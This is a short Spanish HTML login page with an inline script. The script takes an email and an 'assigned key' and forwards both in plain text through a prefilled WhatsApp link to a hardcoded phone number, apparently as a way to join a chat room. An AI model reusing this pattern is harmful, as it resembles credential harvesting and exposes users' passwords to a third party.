<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación de Acceso</title>
</head>
<body>

  <!-- AQUÍ PEGAS EL CÓDIGO DEL FORMULARIO Y SCRIPT -->
  <form id="formularioVerificacion">
    <input type="email" id="correo" placeholder="Correo electrónico" required />
    <input type="password" id="clave" placeholder="Clave asignada" required />
    <input type="password" id="confirmacionClave" placeholder="Confirmar clave" required />
    
    <button type="submit">Entrar al chat</button>
  </form>

  <script>
    document.getElementById('formularioVerificacion').addEventListener('submit', function(e) {
      e.preventDefault();

      const correo = document.getElementById('correo').value.trim();
      const clave = document.getElementById('clave').value.trim();
      const confirmacionClave = document.getElementById('confirmacionClave').value.trim();

      if (clave !== confirmacionClave) {
        alert("Las claves no coinciden. Por favor verifica.");
        return;
      }

      const numeroAdmin = "573241447817"; 
      const textoMensaje = `Hola, yo soy ${correo}.\nMi clave es: ${clave}\nConfirmación de clave: ${confirmacionClave}\nQuedo activo aquí para la sala de confrontación.`;
      const mensajeCodificado = encodeURIComponent(textoMensaje);

      window.location.href = `https://wa.me/${numeroAdmin}?text=${mensajeCodificado}`;
    });
  </script>

</body>
</html>
